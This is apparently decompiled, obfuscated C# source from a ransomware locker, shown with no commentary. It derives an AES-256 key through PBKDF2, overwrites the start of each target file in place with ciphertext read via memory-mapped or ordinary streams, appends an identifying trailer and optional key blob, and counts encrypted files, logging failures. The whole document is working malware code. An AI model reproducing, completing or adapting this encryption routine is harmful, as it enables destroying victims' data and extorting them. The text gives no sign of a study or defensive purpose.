using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace JNgWsfAJdq;

public static class bQwLemggMIXO
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] FIiJNguIBznfy(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = LnBNHvhnjsXm(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes LnBNHvhnjsXm(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] JPoqfLkNbop(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (vjvaexovZfdCP.RnjVpuumuPDdKRf == getString_0(107396990))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (vjvaexovZfdCP.mLogOAlXxCGZma)
			{
				try
				{
					File.AppendAllText(vjvaexovZfdCP.PuxbPamNEvKf, getString_0(107349929) + string_0 + getString_0(107460993) + ex.Message + getString_0(107396664));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void feLfHlEZaImINg(string UJrBcShqTfC, byte[] gfVWmhJNzzTr, byte[] UzwiGYbBhSc = null)
	{
		try
		{
			byte[] array = null;
			if (vjvaexovZfdCP.RnjVpuumuPDdKRf == getString_0(107396990))
			{
				array = (vjvaexovZfdCP.XuGnEkReQEL ? Encoding.ASCII.GetBytes(vjvaexovZfdCP.OQNgkgiZsRBtM(vjvaexovZfdCP.YhJjGoAdhpaRmmM) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460935)) + Convert.ToString(vjvaexovZfdCP.ySwjQogNty) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460935))) : Encoding.ASCII.GetBytes(vjvaexovZfdCP.OQNgkgiZsRBtM(vjvaexovZfdCP.YhJjGoAdhpaRmmM) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460944)) + Convert.ToString(vjvaexovZfdCP.ySwjQogNty) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460944))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(UJrBcShqTfC, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(gfVWmhJNzzTr, 0, gfVWmhJNzzTr.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(UJrBcShqTfC, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!vjvaexovZfdCP.XuGnEkReQEL)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(UzwiGYbBhSc, 0, UzwiGYbBhSc.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (vjvaexovZfdCP.XuGnEkReQEL ? Encoding.ASCII.GetBytes(vjvaexovZfdCP.OQNgkgiZsRBtM(vjvaexovZfdCP.YhJjGoAdhpaRmmM) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460935)) + Convert.ToString(vjvaexovZfdCP.ySwjQogNty) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460935))) : Encoding.ASCII.GetBytes(vjvaexovZfdCP.OQNgkgiZsRBtM(vjvaexovZfdCP.YhJjGoAdhpaRmmM) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460944)) + Convert.ToString(vjvaexovZfdCP.ySwjQogNty) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460944))));
				FileStream fileStream2 = new FileStream(UJrBcShqTfC, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(gfVWmhJNzzTr, 0, gfVWmhJNzzTr.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(UJrBcShqTfC, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!vjvaexovZfdCP.XuGnEkReQEL)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(UzwiGYbBhSc, 0, UzwiGYbBhSc.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			vjvaexovZfdCP.oNVtehkGXSvfD++;
		}
		catch (Exception ex)
		{
			if (vjvaexovZfdCP.mLogOAlXxCGZma)
			{
				try
				{
					File.AppendAllText(vjvaexovZfdCP.PuxbPamNEvKf, getString_0(107349929) + UJrBcShqTfC + getString_0(107460958) + ex.Message + getString_0(107396664));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (vjvaexovZfdCP.XuGnEkReQEL ? Encoding.ASCII.GetBytes(vjvaexovZfdCP.OQNgkgiZsRBtM(vjvaexovZfdCP.YhJjGoAdhpaRmmM) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460935)) + Convert.ToString(vjvaexovZfdCP.ySwjQogNty) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460935))) : Encoding.ASCII.GetBytes(vjvaexovZfdCP.OQNgkgiZsRBtM(vjvaexovZfdCP.YhJjGoAdhpaRmmM) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460944)) + Convert.ToString(vjvaexovZfdCP.ySwjQogNty) + vjvaexovZfdCP.OQNgkgiZsRBtM(getString_0(107460944))));
			FileStream fileStream4 = new FileStream(UJrBcShqTfC, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(gfVWmhJNzzTr, 0, gfVWmhJNzzTr.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(UJrBcShqTfC, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!vjvaexovZfdCP.XuGnEkReQEL)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(UzwiGYbBhSc, 0, UzwiGYbBhSc.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static bQwLemggMIXO()
	{
		Strings.CreateGetStringDelegate(typeof(bQwLemggMIXO));
	}
}
